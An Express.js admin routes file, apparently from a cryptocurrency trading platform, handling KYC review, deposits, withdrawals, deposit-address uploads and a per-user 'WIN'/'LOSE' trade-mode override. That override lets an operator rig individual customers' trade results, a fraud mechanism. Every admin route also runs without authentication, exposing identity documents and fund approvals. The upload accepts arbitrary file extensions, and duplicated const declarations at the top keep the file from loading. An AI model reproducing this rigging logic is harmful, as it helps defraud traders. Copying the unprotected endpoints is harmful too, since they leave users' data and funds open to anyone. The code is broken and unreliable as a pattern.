// routes/admin.js
const { authenticateToken } = require('../middleware/auth');
const express = require('express');
const router = express.Router();
const pool = require('../db');
const multer = require('multer');   // <-- ADD
const fs = require('fs');           // <-- ADD
const path = require('path');       // <-- ADD
const { authenticateToken } = require('../middleware/auth');
const express = require('express');
const router = express.Router();
const pool = require('../db');

// --- GET all users (admin panel) ---
router.get('/users', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT 
        u.id, u.username, u.email, u.verified, u.kyc_status, u.kyc_selfie, u.kyc_id_card,
        tm.mode AS trade_mode
       FROM users u
       LEFT JOIN user_trade_modes tm ON u.id = tm.user_id
       ORDER BY u.id DESC`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ message: 'Failed to fetch users' });
  }
});

// --- Approve/Reject KYC (admin) ---
router.post('/kyc-status', async (req, res) => {
  const { user_id, status } = req.body;
  if (!user_id || !['approved', 'rejected', 'pending'].includes(status)) {
    return res.status(400).json({ error: "Invalid input" });
  }
  try {
    await pool.query(
      `UPDATE users SET kyc_status = $1 WHERE id = $2`,
      [status, user_id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "DB error" });
  }
});

// --- Approve/Reject Deposit (admin) ---
router.post('/deposits/:id/status', async (req, res) => {
  const { status } = req.body;
  const { id } = req.params;
  if (!["approved", "rejected", "pending"].includes(status)) {
    return res.status(400).json({ error: "Invalid status" });
  }
  try {
    const { rows } = await pool.query('SELECT * FROM deposits WHERE id = $1', [id]);
    const deposit = rows[0];
    if (!deposit) return res.status(404).json({ error: "Deposit not found" });

    await pool.query('UPDATE deposits SET status = $1 WHERE id = $2', [status, id]);

    if (status === "approved") {
      await pool.query(
        `INSERT INTO user_balances (user_id, coin, balance)
         VALUES ($1, $2, $3)
         ON CONFLICT (user_id, coin) DO UPDATE SET balance = user_balances.balance + EXCLUDED.balance`,
        [deposit.user_id, deposit.coin, deposit.amount]
      );
      return res.json({ success: true, balanceAdded: true });
    } else {
      return res.json({ success: true, balanceAdded: false });
    }
  } catch (err) {
    res.status(500).json({ error: "Database error" });
  }
});

// --- Approve/Reject Withdrawal (admin) ---
router.post('/withdrawals/:id/status', async (req, res) => {
  const { status } = req.body;
  const { id } = req.params;
  if (!["approved", "rejected", "pending"].includes(status)) {
    return res.status(400).json({ error: "Invalid status" });
  }
  try {
    const { rows } = await pool.query('SELECT * FROM withdrawals WHERE id = $1', [id]);
    const withdrawal = rows[0];
    if (!withdrawal) return res.status(404).json({ error: "Withdrawal not found" });

    const { rows: statusRows } = await pool.query('SELECT status FROM withdrawals WHERE id = $1', [id]);
    const row = statusRows[0];
    if (!row) return res.status(500).json({ error: "Database error" });

    if (row.status !== 'approved' && status === "approved") {
      const { rows: balRows } = await pool.query(
        'SELECT balance FROM user_balances WHERE user_id = $1 AND coin = $2',
        [withdrawal.user_id, withdrawal.coin]
      );
      const userBal = balRows[0];
      if (!userBal) return res.status(500).json({ error: "User balance not found" });
      if (parseFloat(userBal.balance) < parseFloat(withdrawal.amount)) {
        return res.status(400).json({ error: "Insufficient balance" });
      }
      await pool.query('UPDATE withdrawals SET status = $1 WHERE id = $2', [status, id]);
      await pool.query(
        'UPDATE user_balances SET balance = balance - $1 WHERE user_id = $2 AND coin = $3',
        [withdrawal.amount, withdrawal.user_id, withdrawal.coin]
      );
      return res.json({ success: true, balanceReduced: true });
    } else {
      await pool.query('UPDATE withdrawals SET status = $1 WHERE id = $2', [status, id]);
      res.json({ success: true, balanceReduced: false });
    }
  } catch (err) {
    res.status(500).json({ error: "Database error" });
  }
});

// --- Delete User (Admin) ---
router.delete('/users/:id', async (req, res) => {
  const userId = req.params.id;
  if (!userId) return res.status(400).json({ error: "Missing user ID" });
  try {
    await pool.query(`DELETE FROM users WHERE id = $1`, [userId]);
    res.json({ success: true, message: "User deleted" });
  } catch (err) {
    res.status(500).json({ error: "Failed to delete user" });
  }
});

// mode: 'WIN', 'LOSE', or null to remove override
router.post('/users/:id/trade-mode', async (req, res) => {
  const { id } = req.params;
  const { mode } = req.body;
  if (mode !== "WIN" && mode !== "LOSE" && mode !== null && mode !== "") {
    return res.status(400).json({ error: "Invalid mode" });
  }
  try {
    if (mode) {
      await pool.query(
        `INSERT INTO user_trade_modes (user_id, mode) VALUES ($1, $2)
         ON CONFLICT (user_id) DO UPDATE SET mode = EXCLUDED.mode`,
        [id, mode]
      );
      res.json({ success: true, mode });
    } else {
      await pool.query(
        `DELETE FROM user_trade_modes WHERE user_id = $1`,
        [id]
      );
      res.json({ success: true, removed: true });
    }
  } catch (err) {
    res.status(500).json({ error: "Failed to set/remove mode" });
  }
});

// ---- Get current user trade mode ----
router.get('/users/:id/trade-mode', async (req, res) => {
  const { id } = req.params;
  try {
    const { rows } = await pool.query(
      `SELECT mode FROM user_trade_modes WHERE user_id = $1`,
      [id]
    );
    res.json({ mode: rows.length > 0 ? rows[0].mode : null });
  } catch (err) {
    res.status(500).json({ error: "DB error" });
  }
});

// --- GET all trades (admin panel) ---
router.get('/trades', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT 
          t.id,
          t.user_id,
          u.username,
          t.coin,
          t.direction,
          t.amount,
          t.result,
          t.approved,
          t.created_at,
          t.timestamp,
          t.start_price,
          t.profit,
          t.duration
       FROM trades t
       LEFT JOIN users u ON t.user_id = u.id
       ORDER BY t.id DESC`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ message: 'Failed to fetch trades', detail: err.message });
  }
});


// --- GET all withdrawals (admin panel) ---
router.get('/withdrawals', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT 
        id,
        user_id,
        coin,
        amount,
        address,
        network,
        created_at,
        status
      FROM withdrawals
      ORDER BY id DESC`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ message: 'Failed to fetch withdrawals', detail: err.message });
  }
});

// --- GET all deposit addresses (for WalletPage.js) ---
router.get('/deposit-addresses', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT coin, address, qr_url FROM deposit_addresses ORDER BY coin`
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: 'DB error: ' + err.message });
  }
});

// --- Admin: Add/Update deposit address (with QR image upload) ---
const depositUploadsDir = path.resolve(__dirname, '../uploads');
if (!fs.existsSync(depositUploadsDir)) {
  fs.mkdirSync(depositUploadsDir, { recursive: true });
}
const depositQrStorage = multer.diskStorage({
  destination: depositUploadsDir,
  filename: (req, file, cb) => {
    const safeCoin = req.body.coin.replace(/[^a-z0-9]/gi, '_');
    cb(null, safeCoin + '_' + Date.now() + path.extname(file.originalname));
  }
});
const depositQrUpload = multer({ storage: depositQrStorage });

// POST /api/admin/deposit-addresses
router.post('/deposit-addresses', depositQrUpload.single('qr'), async (req, res) => {
  const { coin, address } = req.body;
  let qr_url = null;
  if (!coin || !address) return res.status(400).json({ error: 'Missing coin or address' });

  if (req.file) {
    qr_url = `/uploads/${req.file.filename}`;
  }

  try {
    let params;
    const hasQr = !!qr_url;
    if (hasQr) {
      params = [address, coin, qr_url];
    } else {
      params = [address, coin];
    }
    const sql = hasQr
      ? `INSERT INTO deposit_addresses (address, coin, qr_url, updated_at)
           VALUES ($1, $2, $3, NOW())
         ON CONFLICT (coin)
           DO UPDATE SET address = $1, qr_url = $3, updated_at = NOW()`
      : `UPDATE deposit_addresses SET address = $1, updated_at = NOW() WHERE coin = $2`;

    await pool.query(sql, params);
    res.json({ success: true, coin, address, qr_url });
  } catch (err) {
    res.status(500).json({ error: 'DB error: ' + err.message });
  }
});



module.exports = router;
